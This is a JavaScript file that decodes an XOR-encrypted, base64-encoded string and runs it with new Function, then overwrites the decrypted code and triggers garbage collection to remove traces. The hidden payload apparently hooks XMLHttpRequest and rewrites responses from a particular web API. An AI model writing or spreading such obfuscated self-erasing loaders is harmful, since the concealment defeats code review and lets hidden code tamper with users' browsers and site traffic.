function decryptAndRun(window, encryptedStr, key = 123) {
  let decryptedCode = '';
  try {
    const decodedBase64 = decodeURIComponent(escape(atob(encryptedStr)));
    decryptedCode = decodedBase64.split('').map(char => 
      String.fromCharCode(char.charCodeAt(0) ^ key)
    ).join('');
  } catch (e) {
    console.error("err:", e);
    return;
  }
try{
     execFunc = new Function('window', decryptedCode); 
     execFunc(window);
     console.log("exeok");
   } catch (e) {
     console.error("err：", e);
   } finally {
     decryptedCode = new Array(decryptedCode.length || 0).fill('').join('*');
     execFunc = null; 
     if (typeof window.gc === 'function') window.gc();

  console.log("内存已清理");
}

}
const encryptedstr = "Ux0OFRgPEhQVUwwSFR8UDFIAcRgUFQgPWzQJEhwSFRoXIzMpW0ZbDBIVHxQMVSM2NzMPDwspHgoOHggPQHEYFxoICFs2AiMzKVseAw8eFR8IWzQJEhwSFRoXIzMpWwBxW1sYFBUIDwkOGA8UCVNSWwBxW1tbWwgOCx4JU1JAcVtbW1sPExIIVRofHz4NHhUPNxIIDx4VHglTXBcUGh8IDxoJD1xXW1MeUltGRVsAcVtbW1tbWxgUFQgUFx5VFxQcU1zjgavmip3miZEjMynorozmsLnjgapcV1sAcVtbW1tbW1tbFh4PExQfQVsPExIIVRYeDxMUH1dxW1tbW1tbW1sOCRdBWw8TEghVDgkXV3FbW1tbW1tbWxkUHwJBWw8TEghVCR4KDh4IDzkUHwJxW1tbW1tbBlJAcQZSQHFbW1tbDxMSCFUaHx8+DR4VDzcSCA8eFR4JU1wXFBofXFdbUx5SW0ZFWwBxW1tbW1tbW1sYFBUIFBceVRcUHFNc44Gr5oqd5omRIzMp5ZK25buv44GqXFdbAHFbW1tbW1tbWwgPGg8OCEFbDxMSCFUIDxoPDghXcVtbW1tbW1tbCR4ICxQVCB5BWw8TEghVCR4ICxQVCB4vHgMPcVtbW1tbWwZSQHFbW1tbW1sSHVtTDxMSCFUOCRdVEhUYFw4fHghTXAgPDh8CCB4JDRIYHlYaCxJVARMSEw4SCBMOVRgUFlQcGg8eDBoCVA9UDUpUCxQLDgs6FQgMHglUFx4ICBQVKxQLDgs+AxoWXFJSWwBxW1tbW1tbEh1TDxMSCFUIDxoPDghbRkZGW0lLS1IAcVtbW1tbW1tbW1sPExIIVQkeCAsUFQgeLx4DD1tGWzEoNDVVCxoJCB5TDxMSCFUJHggLFBUIHi8eAw8HB1wABlxSQHFbW1tbW1tbW1tbDxMSCFUJHggLFBUIHi8eAw9EVR8aDxpEVRceCAgUFS8eCA8qDh4IDxIUFS4IHjIVDx4JHRoYHj8PFAggSyZEVQ8eCA8qDh4IDxIUFURVCg4eCA8SFBU0Cw8SFBUIVR0UCT4aGBNTUxIPHhZXEhUfHgNXGgkJGgJSRkUAcVtbW1tbW1tbW1tbW1sSHVMSDx4WRFUJHggOFw9bRkZGW1lKWVIAcVtbW1tbW1tbW1tbW1tbW1sYFBUIFBceVRcUHFNZ56yv5qCzQVlQEg8eFkRVCBQJD1JAcVtbW1tbW1tbW1tbW1sGcVtbW1tbW1tbW1txW1tbW1tbW1tbWwZSQHFbW1tbW1tbW1tbDxMSCFUJHggLFBUIHi8eAw9bRlsxKDQ1VQgPCRIVHBIdAlMPExIIVQkeCAsUFQgeLx4DD1JAcVtbW1tbWwZxW1tbW1tbBnFbW1tbBlJAcVtbBnFbWwgeFR9TVVVVGgkcCFJbAHFbW1tbDxMSCFUJHgoOHggPORQfAltGWxoJHAggSyZAcVtbW1sIDgseCVUIHhUfU1VVVRoJHAhSQHFbWwZxW1sUCx4VU1VVVRoJHAhSWwBxW1tbWw8TEghVFh4PExQfW0ZbGgkcCCBLJkBxW1tbWw8TEghVDgkXW0ZbGgkcCCBKJkBxW1tbWwgOCx4JVRQLHhVTVVVVGgkcCFJAcVtbBnEGcQwSFR8UDFUjNjczDw8LKR4KDh4ID1tGWzYCIzMpQHEGUlMMEhUfFAxSQA==";
decryptAndRun(window, encryptedstr);